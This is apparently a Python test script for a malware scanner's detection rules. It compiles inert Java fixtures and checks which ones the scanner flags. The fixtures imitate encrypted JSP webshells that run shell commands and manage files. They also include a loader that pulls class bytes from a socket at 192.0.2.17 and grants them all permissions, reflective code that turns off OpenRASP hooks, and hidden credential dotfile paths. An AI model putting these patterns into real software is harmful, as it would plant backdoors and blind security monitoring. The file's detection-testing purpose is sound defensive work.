#!/usr/bin/env python3
"""Compile inert JVM fixtures and check control-channel trait boundaries.

Only javac and static analysis run; the generated classes are never executed.
"""
import argparse
import json
import os
from pathlib import Path
import subprocess


def decode_reports(text):
    decoder = json.JSONDecoder()
    reports = []
    while text.strip():
        obj, end = decoder.raw_decode(text.lstrip())
        text = text.lstrip()[end:]
        reports.extend(obj.get('files', []))
    return reports


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--cleave', default='cleave')
    ap.add_argument('--work-dir', type=Path, required=True)
    args = ap.parse_args()
    root = Path(__file__).resolve().parents[2]
    work = args.work_dir.resolve()
    src, classes = work / 'src', work / 'classes'
    src.mkdir(parents=True, exist_ok=True)
    classes.mkdir(parents=True, exist_ok=True)
    sources = {
        'javax/servlet/ServletRequest.java': 'package javax.servlet; public interface ServletRequest {}',
        'javax/servlet/ServletResponse.java': '''package javax.servlet;
public interface ServletResponse { public ServletOutputStream getOutputStream(); }''',
        'javax/servlet/ServletOutputStream.java': '''package javax.servlet;
public class ServletOutputStream extends java.io.OutputStream {
 public void write(int b) {} public void write(byte[] b) {}
}''',
        'javax/servlet/http/HttpSession.java': '''package javax.servlet.http;
public interface HttpSession { public Object getAttribute(String k); }''',
        'javax/servlet/jsp/JspWriter.java': '''package javax.servlet.jsp;
public class JspWriter { public void clear() {} }''',
        'javax/servlet/jsp/PageContext.java': '''package javax.servlet.jsp;
public abstract class PageContext {
 public abstract javax.servlet.ServletRequest getRequest();
 public abstract javax.servlet.ServletResponse getResponse();
 public abstract javax.servlet.http.HttpSession getSession();
 public abstract JspWriter getOut();
}''',
    }
    # This protocol shape is the intentionally abnormal JSP Object.equals entry.
    # Distinct names, session keys, cipher names and command operands vary.
    def payload(name, body, cipher='AES', entry='equals', superclass=''):
        return f'''import java.io.*; import java.net.*; import java.security.*;
import javax.crypto.*; import javax.crypto.spec.*; import javax.servlet.jsp.*;
public class {name} {superclass} {{
 public boolean {entry}(Object obj) {{ try {{
 PageContext ctx=(PageContext)obj; ctx.getRequest();
 Object key=ctx.getSession().getAttribute("renamed-key");
 {body}
 Cipher crypto=Cipher.getInstance("{cipher}");
 crypto.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(key.toString().getBytes(), "{cipher}"));
 ctx.getResponse().getOutputStream().write(crypto.doFinal(new byte[0]));
 ctx.getOut().clear();
 }} catch(Exception ex) {{}} return true; }}
}}'''
    sources['ReplTask.java'] = payload('ReplTask', '''Process task=Runtime.getRuntime().exec("/bin/sh -c id");
 task.getInputStream().read();''')
    sources['DifferentTask.java'] = payload('DifferentTask', '''String cmd=System.getProperty("task");
 Process renamed=Runtime.getRuntime().exec(cmd); renamed.getInputStream().read();''', 'DES')
    sources['FileTools.java'] = payload('FileTools', '''File selected=new File("/changed/location");
 selected.listFiles(); new FileInputStream(selected).read(); selected.delete();
 selected.renameTo(new File("/changed/destination")); selected.mkdir(); selected.mkdirs();
 new FileOutputStream(selected).close();''')
    sources['StreamStage.java'] = payload('StreamStage', '''Socket peer=new Socket("192.0.2.17",9001);
 DataInputStream data=new DataInputStream(peer.getInputStream());
 byte[] bytes=new byte[data.readInt()]; data.readFully(bytes);
 Permissions rights=new Permissions(); rights.add(new AllPermission());
 Class<?> stage=defineClass(null,bytes,0,bytes.length,new ProtectionDomain(null,rights));
 stage.getMethod("renamedEntry").invoke(stage.newInstance());''', superclass='extends ClassLoader')
    sources['OrdinaryServlet.java'] = payload('OrdinaryServlet', '''File f=new File("/data");
 f.listFiles(); new FileInputStream(f).read(); f.delete(); new FileOutputStream(f).close();''', entry='service')
    sources['OrdinaryCrypto.java'] = '''import javax.crypto.*; import java.io.*;
public class OrdinaryCrypto { public boolean equals(Object value) {
 try { new File("/data").listFiles(); Cipher.getInstance("AES").doFinal(new byte[0]); }
 catch(Exception ex) {} return false; }}'''
    sources['NamesOnly.java'] = '''public class NamesOnly { String[] documentation={
 "com.baidu.openrasp.HookHandler", "enableHook", "setDisableHooks", "setHookWhiteAll"}; }'''
    sources['RenamedGuardTamper.java'] = '''import java.lang.reflect.*;
public class RenamedGuardTamper { public void alter() throws Exception {
 Class<?> h=Class.forName("com.baidu.openrasp.HookHandler");
 Field flag=h.getDeclaredField("enableHook"); flag.setAccessible(true); flag.set(null,new java.util.concurrent.atomic.AtomicBoolean(false));
 Class<?> c=Class.forName("com.baidu.openrasp.config.Config");
 c.getMethod("setDisableHooks",String.class).invoke(null,"true");
 c.getMethod("setHookWhiteAll",String.class).invoke(null,"true"); }}'''
    # A normal filesystem configuration can reference all three dotfiles.
    sources['net/rebeyond/behinder/payload/java/Echo.java'] = (
        'package net.rebeyond.behinder.payload.java;\n' +
        payload('Echo', 'Class.forName("java.util.Base64").getMethod("getEncoder").invoke(null);')[:-1] +
        'private String RunCMD(String cmd) throws Exception {'
        'return Runtime.getRuntime().exec(cmd).getInputStream().toString();} }')
    sources['EnableGuard.java'] = sources['RenamedGuardTamper.java'].replace(
        'RenamedGuardTamper', 'EnableGuard').replace('AtomicBoolean(false)', 'AtomicBoolean(true)').replace(
        'invoke(null,"true")', 'invoke(null,"false")')
    sources['DotfileConfig.java'] = '''public class DotfileConfig { String[] paths={
 "/home/test/.pwd", "/home/test/.username", "/home/test/.botid"}; }'''
    paths = []
    for name, content in sources.items():
        path = src / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(content)
        paths.append(str(path))
    subprocess.run(['javac', '--release', '8', '-Xlint:-options', '-g:none', '-d', str(classes), *paths], check=True)
    targets = [classes / (n + '.class') for n in [
        'ReplTask', 'DifferentTask', 'FileTools', 'StreamStage', 'OrdinaryServlet',
        'OrdinaryCrypto', 'NamesOnly', 'RenamedGuardTamper', 'DotfileConfig', 'EnableGuard']]
    cache = work / 'cache-paths.sh'
    cache.write_text('printf "%s\\n" "/tmp/.pwd" "/tmp/.username" "/tmp/.botid"\n')
    lock = work / 'password-lock.sh'
    lock.write_text('test -f /etc/.pwd.lock\n')
    targets += [cache, lock, classes / 'net/rebeyond/behinder/payload/java/Echo.class']
    env = dict(os.environ, CLEAVE_TRAITS_DIR=str(root), CLEAVE_LOG_LEVEL='error')
    run = subprocess.run([args.cleave, '--traits-dir', str(root), '--json', *map(str, targets)],
                         env=env, capture_output=True, text=True)
    (work / 'scan.json').write_text(run.stdout)
    (work / 'scan.stderr').write_text(run.stderr)
    if run.returncode:
        raise SystemExit(run.stderr)
    reports = {Path(f['path']).stem: f for f in decode_reports(run.stdout)}
    command = 'objectives/command-and-control/backdoor/webshell/request/command::jvm-encrypted-jsp-command-output'
    manager = 'objectives/command-and-control/backdoor/webshell/file-manager::jvm-encrypted-jsp-file-management'
    loader = 'objectives/execution/payload/module-load/network::jvm-control-streamed-unrestricted-classes'
    disable = 'objectives/evasion/anti-av/blinding::openrasp-hook-disable-blinding'
    tamper = 'objectives/evasion/anti-av/blinding::openrasp-reflective-tamper'
    required = {'ReplTask': [command], 'DifferentTask': [command], 'FileTools': [manager, 'micro-behaviors/fs/directory/create::jvm-file-mkdir-reference', 'micro-behaviors/fs/directory/create::jvm-file-mkdirs-reference', 'micro-behaviors/fs/file/move::jvm-file-rename-reference'],
                'StreamStage': [loader], 'RenamedGuardTamper': [disable, tamper]}
    for name, ids in required.items():
        got = {t['id'] for t in reports[name]['traits']}
        assert set(ids) <= got, (name, set(ids) - got)
    for name in ['OrdinaryServlet', 'OrdinaryCrypto', 'NamesOnly', 'DotfileConfig', 'Echo', 'EnableGuard']:
        hostile = [t['id'] for t in reports[name]['traits'] if t['crit'] == 5]
        assert not hostile, (name, hostile)
    paths = {t['id'] for t in reports['cache-paths']['traits']}
    assert {
        'micro-behaviors/fs/path/password-store::hidden-pwd-path-reference',
        'micro-behaviors/fs/path/config/accounts::hidden-username-path-reference',
        'micro-behaviors/fs/path/config/app::hidden-bot-id-path-reference',
    } <= paths, paths
    for name in ['cache-paths', 'password-lock']:
        assert not [t for t in reports[name]['traits'] if t['crit'] >= 4], reports[name]
    assert 'micro-behaviors/fs/path/password-store::hidden-pwd-path-reference' not in {
        t['id'] for t in reports['password-lock']['traits']}
    echo_source = src / 'net/rebeyond/behinder/payload/java/Echo.java'
    echo_source.write_text(echo_source.read_text().replace(
        'PageContext ctx=(PageContext)obj;',
        'RunCMD(System.getProperty("task")); PageContext ctx=(PageContext)obj;'))
    subprocess.run(['javac', '--release', '8', '-Xlint:-options', '-g:none', '-cp', str(classes),
                    '-d', str(classes), str(echo_source)], check=True)
    active = subprocess.run([args.cleave, '--traits-dir', str(root), '--json',
                             str(classes / 'net/rebeyond/behinder/payload/java/Echo.class')],
                            env=env, capture_output=True, text=True, check=True)
    active_ids = {t['id'] for f in decode_reports(active.stdout) for t in f['traits']}
    assert command in active_ids, active_ids
    print('PASS: renamed/cipher/command variants, file manager, streamed loader, OpenRASP and benign controls')


if __name__ == '__main__':
    main()
